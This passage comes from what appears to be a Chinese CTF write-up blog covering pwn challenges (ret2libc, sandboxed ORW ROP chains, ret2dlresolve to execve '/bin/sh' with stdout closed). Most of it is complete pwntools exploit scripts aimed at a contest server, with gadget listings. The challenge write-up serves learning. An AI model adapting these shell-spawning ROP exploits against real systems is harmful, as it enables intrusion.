class=\"number\">0x4040A0</span>+<span class=\"number\">0x200</span></span><br><span class=\"line\">flag_name=<span class=\"number\">0x4040a0</span>+<span class=\"number\">0x200</span>-<span class=\"number\">8</span></span><br><span class=\"line\">flag_addr=bss_st+<span class=\"number\">0x300</span>-<span class=\"number\">0x40</span></span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x401373</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x401371</span></span><br><span class=\"line\">leave=<span class=\"number\">0x4012e6</span></span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_addr=elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_addr=elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">vuln=<span class=\"number\">0x401279</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x200</span>-<span class=\"number\">0x8</span>)+<span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span>+p64(bss_tar+<span class=\"number\">0x100</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadfeef</span>)+p64(write_addr)+p64(<span class=\"number\">0x4012a3</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;everywhere&#x27;</span>,payload1)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p64(bss_tar)+p64(leave)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;voice :&#x27;</span>,migr_pay)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">open64_addr=base+libc.symbols[<span class=\"string\">&#x27;open64&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x142c92</span>+base</span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x2601f</span>+base</span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload2=p64(bss_st+<span class=\"number\">0x100</span>)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(pop_rdx)+p64(<span class=\"number\">0</span>)+p64(open64_addr)+p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(read_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p64(bss_st)+p64(leave)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;voice :&#x27;</span>,migr_pay)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401370 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401372 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004011bd : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401373 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401371 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040121a : ret 0xfffe</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># in libc</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000142c92 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000002601f : pop rsi ; ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"call-me-sys\"><a class=\"anchor\" href=\"#call-me-sys\">#</a> call me sys</h3>\n<p>syscall，但是只能用几个函数<br />\n又是沙箱：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png\" alt=\"\" /><br />\n还是栈溢出漏洞：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png\" alt=\"\" /><br />\n由于没有关掉 open,write,read 函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"> </span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2111</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">syscall_ret=<span class=\"number\">0x4012ec</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x401363</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x401361</span></span><br><span class=\"line\"> </span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;000&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadfeef</span>)+p64(<span class=\"number\">0x401291</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;./f1ag&#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># p.recvuntil(b&#x27;./f1ag\\x00\\x00\\x00&#x27;)</span></span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(func_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">open64_addr=base+libc.symbols[<span class=\"string\">&#x27;open64&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">flag_name=<span class=\"number\">0x4040e0</span></span><br><span class=\"line\">pop_rdx=<span class=\"number\">0x142c92</span>+base</span><br><span class=\"line\">pop_rsi=<span class=\"number\">0x2601f</span>+base</span><br><span class=\"line\">pop_rax=<span class=\"number\">0x36174</span>+base</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rax)+p64(<span class=\"number\">2</span>)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(pop_rdx)+p64(<span class=\"number\">0</span>)+p64(pop_rsi)+p64(<span class=\"number\">0</span>)+p64(syscall_ret)+p64(pop_rax)+p64(<span class=\"number\">0</span>)+p64(pop_rdi)+p64(<span class=\"number\">3</span>)+p64(pop_rsi)+p64(flag_name+<span class=\"number\">0x20</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(syscall_ret)+p64(pop_rax)+p64(<span class=\"number\">1</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi)+p64(flag_name+<span class=\"number\">0x20</span>)+p64(pop_rdx)+p64(<span class=\"number\">0x30</span>)+p64(syscall_ret)+p64(<span class=\"number\">0x401270</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive(<span class=\"number\">0</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401360 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401362 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040119d : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401363 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401361 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040127e : ret 0x14</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012e7 : ret 0x200</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012ba : ret 0x4c</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129c : ret 0x50</span></span><br><span class=\"line\"><span class=\"comment\"># offset in libc</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000036174 : pop rax ; ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"close\"><a class=\"anchor\" href=\"#close\">#</a> close</h3>\n<p>Q: 你 leak 不了一点！hacker！！<br />\nA:？？？？？？<br />\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得 flag<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png\" alt=\"\" /><br />\n 既然我们在 get shell 之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。<br />\n于是毋庸置疑，关于泄露 libc 地址的方法直接一票否决了。<br />\n于是考虑使用 ret2dlresolve 来调用 shell。<br />\n这里使用生成的 payload<br />\n 原本是想用 system (&quot;/bin/sh&quot;) 的，但是发现 system 好像有些神秘问题导致显示：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png\" alt=\"\" /><br />\n于是采用 execve (&quot;/bin/sh&quot;,0,0) 来获取 shell<br />\n 但是由于没有直接 pop rdx 的 gadget，我们使用 csu 来进行 rdx 的修改。（注意这里面的 call 和判断，标记起来了）：<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png\" alt=\"\" /><br />\n所以我们先把想要的 rdx 的值 pop 到 r14 里面，然后返回到 0x4012300 那里，把 r14 赋给 rdx。这里绕过判断就是让 rbx 和 rbp 值相等。这里多调试几下就 OK 了<br />\n之后就 get 到 shell 了。这时候我们要把标准输出重定向到标准错误里面，即 exec 1&gt;&amp;2<br />\nhint: 网上关于标准输出被关闭的情况，有教程：exec 1&gt;&amp;0。但是似乎 ubuntu 20 不太好使。 可以选择把输出重定向给标准错误（2）<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.binary = elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">rop = ROP(context.binary)</span><br><span class=\"line\">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class=\"string\">&quot;execve&quot;</span>,args=[<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"number\">0</span>])</span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>,dlresolve.data_addr)</span><br><span class=\"line\">rop.ret2dlresolve(dlresolve)</span><br><span class=\"line\">raw_rop = rop.chain()</span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./pwn&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># io=process([&#x27;./ld-linux-x86-64.so.2&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># io=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">7001</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">payload0 = flat(&#123;<span class=\"number\">0x98</span>:raw_rop&#125;)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;name&#x27;</span>,<span class=\"string\">&quot;fuck&quot;</span>)</span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x90</span>+p64(<span class=\"number\">0x404e90</span>)+p64(<span class=\"number\">0x40127c</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;response&#x27;</span>,payload1)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(dlresolve.payload.ljust(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)+p64(<span class=\"number\">0x404ff0</span>)+p64(<span class=\"number\">0x401323</span>)+p64(<span class=\"number\">0x402018</span>)+p64(<span class=\"number\">0x40131a</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x402018</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(elf.got[<span class=\"string\">&#x27;alarm&#x27;</span>])+p64(<span class=\"number\">0x401300</span>)+p64(<span class=\"number\">0x404e90</span>)+p64(<span class=\"number\">0x404ff0</span>)+p64(<span class=\"number\">0x401230</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+raw_rop[<span class=\"number\">40</span>:])</span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"><span class=\"comment\"># io.sendline(dlresolve.payload)</span></span><br><span class=\"line\"><span class=\"comment\"># io=remote(&#x27;8.130.110.158&#x27;,7001)</span></span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;exec 1&gt;&amp;2&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;ls&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x404e90</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401320 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401322 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004011bd : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401323 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0000000000401321 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br></pre></td></tr></table></figure></p>\n","length":9440,"excerpt":"","more":"<p>markdown 出问题的话直接看链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96Y29pLmdpdGh1Yi5pby9ibG9ncy9DVEYvbW9udGhnYW1lMjMxMC8=\">https://zcoi.github.io/blogs/CTF/monthgame2310/</span></p>\n<h1 id=\"解题情况\"><a class=\"anchor\" href=\"#解题情况\">#</a> 解题情况</h1>\n<p><img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/web.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png\" alt=\"\" /></p>\n<h1 id=\"解题思路\"><a class=\"anchor\" href=\"#解题思路\">#</a> 解题思路</h1>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"level1-login\"><a class=\"anchor\" href=\"#level1-login\">#</a> level1-Login</h3>\n<p>直接看 html，发现 base64 加密的一串。直接解密就是 flag</p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ret2libc\"><a class=\"anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<p>Q: 请嗯造 libc<br />\nA: 我嗯造 libc</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2110</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">write_addr=elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x4012a3</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x4012a1</span></span><br><span class=\"line\">ret=<span class=\"number\">0x40101a</span></span><br><span class=\"line\">vuln=<span class=\"number\">0x4011db</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload= <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadbeef</span>)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;voice :&#x27;</span>,payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"> </span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;voice :&#x27;</span>,payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a0 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a2 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span 